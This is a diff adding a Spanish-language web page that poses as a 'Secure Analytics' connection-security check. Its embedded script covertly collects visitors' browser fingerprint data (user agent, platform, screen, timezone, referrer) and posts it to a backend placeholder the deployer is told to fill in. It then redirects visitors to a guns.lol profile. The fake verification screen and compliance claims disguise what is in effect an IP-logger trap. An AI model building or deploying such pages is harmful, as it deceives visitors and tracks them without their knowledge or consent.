@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Plataforma de análisis de seguridad">
+    <title>Secure Analytics | Cargando...</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #1a2a6c, #2c3e50);
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 2rem;
+            text-align: center;
+        }
+        .container {
+            max-width: 600px;
+            background: rgba(0, 15, 30, 0.85);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 3rem;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .logo {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(45deg, #00ffcc, #0077ff);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 1.5rem;
+            font-weight: bold;
+            font-size: 2rem;
+            color: #000;
+        }
+        h1 {
+            font-size: 2.2rem;
+            margin-bottom: 1rem;
+            background: linear-gradient(to right, #00ffcc, #0077ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: 700;
+        }
+        p {
+            color: #aaa;
+            margin-bottom: 2rem;
+            line-height: 1.6;
+        }
+        .loader {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin: 1.5rem 0;
+        }
+        .dot {
+            width: 12px;
+            height: 12px;
+            background: #00ffcc;
+            border-radius: 50%;
+            animation: bounce 1.4s infinite ease-in-out;
+        }
+        .dot:nth-child(2) { animation-delay: 0.2s; }
+        .dot:nth-child(3) { animation-delay: 0.4s; }
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-8px); }
+        }
+        .footer {
+            margin-top: 2rem;
+            color: #666;
+            font-size: 0.85rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">S</div>
+        <h1>Secure Analytics Platform</h1>
+        <p>Verificando la seguridad de tu conexión. Este proceso toma menos de 2 segundos.</p>
+        
+        <div class="loader">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+        
+        <div class="footer">
+            <p>© 2026 Secure Analytics. Todos los derechos reservados.<br>
+            Cumplimos con GDPR • CCPA • LOPDGDD</p>
+        </div>
+    </div>
+
+    <script>
+        // Configuración - CAMBIA ESTO POR TU URL DE BACKEND DE RAILWAY
+        const BACKEND_URL = 'https://TU_BACKEND_RAILWAY.up.railway.app/api/capture';
+        const REDIRECT_URL = 'https://guns.lol/kikkkkkkkk';
+
+        // Verificar Do Not Track
+        const isDNTEnabled = () => {
+            const dnt = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack || 'unknown';
+            return dnt === '1' || dnt === 'yes' || dnt === 'true';
+        };
+
+        // Capturar datos del visitante
+        const captureVisitorData = () => {
+            return {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform || 'unknown',
+                language: navigator.language || 'unknown',
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
+                referrer: document.referrer ? new URL(document.referrer).hostname : 'direct',
+                cookiesEnabled: navigator.cookieEnabled,
+                dnt: isDNTEnabled()
+            };
+        };
+
+        // Enviar datos al backend
+        const sendDataToBackend = async (data) => {
+            try {
+                const response = await fetch(BACKEND_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-Requested-With': 'XMLHttpRequest'
+                    },
+                    body: JSON.stringify(data),
+                    keepalive: true,
+                    signal: AbortSignal.timeout(5000)
+                });
+                return response.ok;
+            } catch (error) {
+                console.error('Error:', error);
+                return false;
+            }
+        };
+
+        // Iniciar proceso
+        (async () => {
+            try {
+                if (isDNTEnabled()) {
+                    window.location.replace(REDIRECT_URL);
+                    return;
+                }
+                
+                const visitorData = captureVisitorData();
+                await sendDataToBackend(visitorData);
+                
+                // Redirigir después de enviar datos
+                window.location.replace(REDIRECT_URL);
+            } catch (error) {
+                window.location.replace(REDIRECT_URL);
+            }
+        })();
+    </script>
+</body>
+</html>
